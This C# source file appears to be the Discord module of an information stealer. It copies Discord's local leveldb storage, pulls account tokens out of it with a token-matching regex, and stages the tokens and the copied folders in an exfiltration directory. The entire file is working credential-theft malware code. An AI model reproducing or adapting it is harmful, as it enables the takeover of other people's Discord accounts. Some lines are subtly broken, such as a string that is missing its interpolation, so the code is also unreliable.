﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace youknowcaliber
{
	internal class Discord
	{
		public static void WriteDiscord()
		{
			try
			{
				string text = Help.ExploitDir + "\\Discord";
				string[] tokens = Discord.GetTokens();
				bool flag = tokens.Length != 0;
				if (flag)
				{
					Directory.CreateDirectory(text);
					foreach (string str in tokens)
					{
						File.AppendAllText(text + "\\Tokens.txt", str + "\n");
					}
				}
				Discord.CopyLevelDb();
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		private static void CopyLevelDb()
		{
			string path = Help.ExploitDir + "\\Discord";
			foreach (string path2 in Discord.DiscordDirectories)
			{
				string directoryName = Path.GetDirectoryName(Path.Combine(Paths.appdata, path2));
				string destFolder = Path.Combine(path, new DirectoryInfo(directoryName).Name);
				bool flag = !Directory.Exists(directoryName);
				if (flag)
				{
					break;
				}
				try
				{
					Filemanager.CopyDirectory(directoryName, destFolder);
					Counting.Discord++;
				}
				catch
				{
				}
			}
		}

		public static string[] GetTokens()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (string path in Discord.DiscordDirectories)
				{
					string text = Path.Combine(Paths.appdata, path);
					string text2 = Path.Combine(Path.GetTempPath(), new DirectoryInfo(text).Name);
					bool flag = !Directory.Exists(text);
					if (!flag)
					{
						Filemanager.CopyDirectory(text, text2);
						foreach (string text3 in Directory.GetFiles(text2))
						{
							bool flag2 = !text3.EndsWith(".log") && !text3.EndsWith(".ldb");
							if (!flag2)
							{
								string input = File.ReadAllText(text3);
								Match match = Discord.TokenRegex.Match(input);
								bool success = match.Success;
								if (success)
								{
									list.Add("{match.Value}");
								}
								Counting.Discord++;
							}
						}
						Filemanager.RecursiveDelete(text2);
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return list.ToArray();
		}

		private static Regex TokenRegex = new Regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}");

		private static string[] DiscordDirectories = new string[]
		{
			"Discord\\Local Storage\\leveldb",
			"Discord PTB\\Local Storage\\leveldb",
			"Discord Canary\\leveldb"
		};
	}
}
